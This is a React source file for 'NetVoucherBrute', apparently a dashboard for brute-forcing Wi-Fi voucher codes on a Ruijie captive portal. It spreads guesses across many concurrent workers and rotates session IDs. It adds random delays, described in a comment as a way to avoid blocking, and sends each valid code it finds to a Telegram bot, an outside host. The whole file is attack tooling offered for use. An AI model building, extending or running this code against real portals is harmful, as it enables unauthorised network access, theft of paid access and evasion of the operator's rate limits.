import React, { useState, useEffect, useCallback, useRef } from 'react';
import { 
  Play, Pause, Settings, ShieldAlert, Activity, 
  Wifi, Users, Key, Download, Trash2, Cpu
} from 'lucide-react';
import ConsoleLog from './components/ConsoleLog';
import StatCard from './components/StatCard';
import { Config, LogEntry, ScanStats, SessionSlot, ValidCode } from './types';
import { fetchSessionId, generateAccessCode, checkCode, sendTelegramAlert } from './services/scannerLogic';

const DEFAULT_CONFIG: Config = {
  targetUrl: 'https://portal-as.ruijienetworks.com',
  telegramBotToken: '',
  telegramChatId: '',
  threadCount: 20, // Web browsers handle threads differently, this is concurrent promises
  simulationMode: true
};

const MAX_LOGS = 200;

export default function App() {
  // State
  const [isRunning, setIsRunning] = useState(false);
  const [config, setConfig] = useState<Config>(DEFAULT_CONFIG);
  const [showConfig, setShowConfig] = useState(false);
  const [stats, setStats] = useState<ScanStats>({
    attempts: 0,
    validFound: 0,
    sessionsActive: 0,
    startTime: null
  });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [validCodes, setValidCodes] = useState<ValidCode[]>([]);
  
  // Refs for async loop management
  const sessionsRef = useRef<SessionSlot[]>([]);
  const isRunningRef = useRef(false);
  const statsRef = useRef(stats);
  
  // Load config from localstorage
  useEffect(() => {
    const saved = localStorage.getItem('netvoucher_config');
    if (saved) {
        try {
            setConfig({ ...DEFAULT_CONFIG, ...JSON.parse(saved) });
        } catch(e) {}
    }
  }, []);

  useEffect(() => {
    localStorage.setItem('netvoucher_config', JSON.stringify(config));
  }, [config]);

  useEffect(() => {
    statsRef.current = stats;
  }, [stats]);

  const addLog = useCallback((message: string, type: LogEntry['type'] = 'info') => {
    const entry: LogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toLocaleTimeString(),
      message,
      type
    };
    setLogs(prev => [...prev.slice(-MAX_LOGS), entry]);
  }, []);

  // --- Core Worker Logic ---

  // Session Manager
  const manageSessions = useCallback(async () => {
    if (!isRunningRef.current) return;
    
    // Target 50% of thread count as active sessions
    const targetSessions = Math.max(1, Math.floor(config.threadCount / 2));
    
    if (sessionsRef.current.length < targetSessions) {
      addLog('Pool low. Fetching new session ID...', 'warning');
      const sid = await fetchSessionId(config);
      
      if (sid) {
        sessionsRef.current.push({
          id: Math.random().toString(36),
          sessionId: sid,
          remainingUses: 40 // Matches Python PER_SESSION_MAX
        });
        addLog(`Added session: ${sid.substring(0, 8)}...`, 'info');
      } else {
        addLog('Failed to fetch session. Retrying...', 'error');
      }
    }
    
    // Update active count for UI
    setStats(prev => ({...prev, sessionsActive: sessionsRef.current.length}));
    
    if (isRunningRef.current) {
        setTimeout(manageSessions, 1000);
    }
  }, [config, addLog]);

  // Worker Loop (Recursive Promise Chain)
  const spawnWorker = useCallback(async (workerId: number) => {
    if (!isRunningRef.current) return;

    if (sessionsRef.current.length === 0) {
      // Wait for sessions
      setTimeout(() => spawnWorker(workerId), 500);
      return;
    }

    // Get a session
    const sessionIndex = Math.floor(Math.random() * sessionsRef.current.length);
    const sessionSlot = sessionsRef.current[sessionIndex];
    
    if (!sessionSlot) {
       setTimeout(() => spawnWorker(workerId), 100);
       return;
    }

    // Try a code
    const code = generateAccessCode();
    // addLog(`Worker ${workerId} trying ${code} on ${sessionSlot.sessionId.substring(0,6)}...`, 'info'); // Too verbose for UI

    const result = await checkCode(code, sessionSlot.sessionId, config);

    // Update Stats
    setStats(prev => ({
        ...prev,
        attempts: prev.attempts + 1
    }));

    if (result.valid) {
      addLog(`VALID CODE FOUND: ${code}`, 'success');
      setValidCodes(prev => [...prev, {
          code,
          timestamp: new Date().toLocaleString(),
          sessionId: sessionSlot.sessionId
      }]);
      setStats(prev => ({...prev, validFound: prev.validFound + 1}));
      
      // Send Telegram
      await sendTelegramAlert(code, sessionSlot.sessionId, config);
    } else if (result.message.includes('timeout') || result.status === 401) {
       addLog(`Session ${sessionSlot.sessionId.substring(0,8)} expired/banned.`, 'error');
       // Remove session
       sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
    } else {
       // Decrement usage
       sessionSlot.remainingUses--;
       if (sessionSlot.remainingUses <= 0) {
           sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
       }
    }

    // Next loop with slight random delay to behave like human/reduce blockage
    const delay = Math.random() * 50; 
    setTimeout(() => spawnWorker(workerId), delay);

  }, [config, addLog]);


  const toggleScan = () => {
    if (isRunning) {
        // Stop
        setIsRunning(false);
        isRunningRef.current = false;
        addLog('Stopping all workers...', 'warning');
    } else {
        // Start
        setIsRunning(true);
        isRunningRef.current = true;
        setStats(prev => ({...prev, startTime: Date.now()}));
        addLog(`Initializing scan with ${config.threadCount} concurrent workers...`, 'success');
        
        // Start Session Manager
        manageSessions();

        // Start Workers
        for(let i=0; i < config.threadCount; i++) {
            setTimeout(() => spawnWorker(i), i * 50); // Stagger start
        }
    }
  };

  const downloadResults = () => {
    const content = validCodes.map(v => `${v.timestamp}\t${v.code}\t${v.sessionId}`).join('\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `valid_codes_${Date.now()}.txt`;
    a.click();
  };

  // Calculate speed
  const getSpeed = () => {
    if (!stats.startTime) return 0;
    const seconds = (Date.now() - stats.startTime) / 1000;
    return seconds > 0 ? Math.round(stats.attempts / seconds) : 0;
  };

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-200 font-sans selection:bg-emerald-500/30">
      
      {/* Navbar */}
      <header className="border-b border-zinc-800 bg-zinc-950/80 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
            <div className="flex items-center gap-2">
                <ShieldAlert className="w-6 h-6 text-emerald-500" />
                <h1 className="text-lg font-bold tracking-tight text-white">NetVoucher<span className="text-emerald-500">Brute</span></h1>
            </div>
            
            <div className="flex items-center gap-3">
                 <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-zinc-900 rounded-full border border-zinc-800">
                    <div className={`w-2 h-2 rounded-full ${isRunning ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`} />
                    <span className="text-xs font-mono text-zinc-400">{isRunning ? 'SYSTEM ACTIVE' : 'SYSTEM IDLE'}</span>
                 </div>
                 <button 
                    onClick={() => setShowConfig(!showConfig)}
                    className="p-2 hover:bg-zinc-800 rounded-lg transition-colors text-zinc-400 hover:text-white"
                 >
                    <Settings className="w-5 h-5" />
                 </button>
            </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-6 grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Left Column: Controls & Stats */}
        <div className="lg:col-span-2 space-y-6">
            
            {/* Stats Grid */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <StatCard 
                    label="Attempts" 
                    value={stats.attempts.toLocaleString()} 
                    icon={<Activity className="w-4 h-4" />} 
                    trend={`${getSpeed()} req/s`}
                />
                <StatCard 
                    label="Valid Codes" 
                    value={stats.validFound} 
                    icon={<Key className="w-4 h-4" />} 
                    color="emerald"
                />
                 <StatCard 
                    label="Active Sessions" 
                    value={stats.sessionsActive} 
                    icon={<Users className="w-4 h-4" />} 
                    color="blue"
                />
                 <StatCard 
                    label="Thread Count" 
                    value={config.threadCount} 
                    icon={<Cpu className="w-4 h-4" />} 
                />
            </div>

            {/* Configuration Panel (Collapsible) */}
            {showConfig && (
                <div className="bg-zinc-900 border border-zinc-800 rounded-lg p-6 animate-in slide-in-from-top-4">
                    <h2 className="text-sm font-bold text-white uppercase tracking-wider mb-4 flex items-center gap-2">
                        <Settings className="w-4 h-4 text-zinc-500" /> Configuration
                    </h2>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label className="block text-xs text-zinc-500 mb-1">Target URL</label>
                            <input 
                                type="text" 
                                className="w-full bg-zinc-950 border border-zinc-700 rounded p-2 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                value={config.targetUrl}
                                onChange={e => setConfig({...config, targetUrl: e.target.value})}
                                disabled={isRunning}
                            />
                        </div>
                        <div>
                            <label className="block text-xs text-zinc-500 mb-1">Thread/Worker Count</label>
                            <input 
                                type="number" 
                                className="w-full bg-zinc-950 border border-zinc-700 rounded p-2 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                value={config.threadCount}
                                onChange={e => setConfig({...config, threadCount: parseInt(e.target.value) || 1})}
                                disabled={isRunning}
                            />
                        </div>
                         <div>
                            <label className="block text-xs text-zinc-500 mb-1">Telegram Bot Token</label>
                            <input 
                                type="password" 
                                className="w-full bg-zinc-950 border border-zinc-700 rounded p-2 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                value={config.telegramBotToken}
                                onChange={e => setConfig({...config, telegramBotToken: e.target.value})}
                                placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
                            />
                        </div>
                        <div>
                            <label className="block text-xs text-zinc-500 mb-1">Telegram Chat ID</label>
                            <input 
                                type="text" 
                                className="w-full bg-zinc-950 border border-zinc-700 rounded p-2 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                value={config.telegramChatId}
                                onChange={e => setConfig({...config, telegramChatId: e.target.value})}
                                placeholder="12345678"
                            />
                        </div>
                    </div>
                    
                    <div className="mt-4 flex items-center gap-2">
                         <input 
                            type="checkbox" 
                            id="simMode"
                            checked={config.simulationMode}
                            onChange={(e) => setConfig({...config, simulationMode: e.target.checked})}
                            disabled={isRunning}
                            className="w-4 h-4 accent-emerald-500 bg-zinc-800 border-zinc-700 rounded"
                         />
                         <label htmlFor="simMode" className="text-sm text-zinc-400 select-none cursor-pointer">
                            Enable Simulation Mode (Bypasses CORS for UI Testing)
                         </label>
                    </div>
                </div>
            )}

            {/* Main Action Button */}
            <button
                onClick={toggleScan}
                className={`w-full py-4 rounded-lg font-bold text-lg tracking-wide shadow-lg transition-all flex items-center justify-center gap-2 ${
                    isRunning 
                    ? 'bg-red-500/10 text-red-500 border border-red-500/50 hover:bg-red-500/20' 
                    : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-900/20'
                }`}
            >
                {isRunning ? (
                    <><Pause className="w-5 h-5 fill-current" /> STOP OPERATION</>
                ) : (
                    <><Play className="w-5 h-5 fill-current" /> INITIATE SCAN</>
                )}
            </button>

            {/* Console Log */}
            <div className="h-96">
                <ConsoleLog logs={logs} />
            </div>

        </div>

        {/* Right Column: Results */}
        <div className="space-y-6">
            <div className="bg-zinc-900 border border-zinc-800 rounded-lg overflow-hidden flex flex-col h-[calc(100vh-8rem)] sticky top-24">
                <div className="p-4 border-b border-zinc-800 flex items-center justify-between bg-zinc-900">
                    <div className="flex items-center gap-2">
                        <Wifi className="w-4 h-4 text-emerald-500" />
                        <h3 className="text-sm font-bold text-white uppercase">Valid Codes</h3>
                        <span className="bg-emerald-500/10 text-emerald-500 text-xs px-2 py-0.5 rounded-full font-mono">
                            {validCodes.length}
                        </span>
                    </div>
                    {validCodes.length > 0 && (
                        <div className="flex gap-1">
                             <button onClick={() => setValidCodes([])} className="p-1.5 hover:bg-zinc-800 rounded text-zinc-500 hover:text-red-400">
                                <Trash2 className="w-4 h-4" />
                            </button>
                            <button onClick={downloadResults} className="p-1.5 hover:bg-zinc-800 rounded text-zinc-500 hover:text-white">
                                <Download className="w-4 h-4" />
                            </button>
                        </div>
                    )}
                </div>
                
                <div className="flex-1 overflow-y-auto p-2 space-y-2">
                    {validCodes.length === 0 ? (
                        <div className="h-full flex flex-col items-center justify-center text-zinc-600 gap-2">
                            <Key className="w-8 h-8 opacity-20" />
                            <span className="text-xs">No valid codes found yet.</span>
                        </div>
                    ) : (
                        validCodes.map((code, idx) => (
                            <div key={idx} className="bg-zinc-950 border border-emerald-500/30 p-3 rounded group hover:border-emerald-500 transition-colors">
                                <div className="flex justify-between items-center mb-1">
                                    <span className="text-lg font-mono font-bold text-white tracking-widest">{code.code}</span>
                                    <span className="text-[10px] text-zinc-500">{code.timestamp}</span>
                                </div>
                                <div className="text-xs font-mono text-zinc-500 truncate">
                                    SID: <span className="text-zinc-400">{code.sessionId}</span>
                                </div>
                            </div>
                        ))
                    )}
                </div>
            </div>
        </div>

      </main>
    </div>
  );
}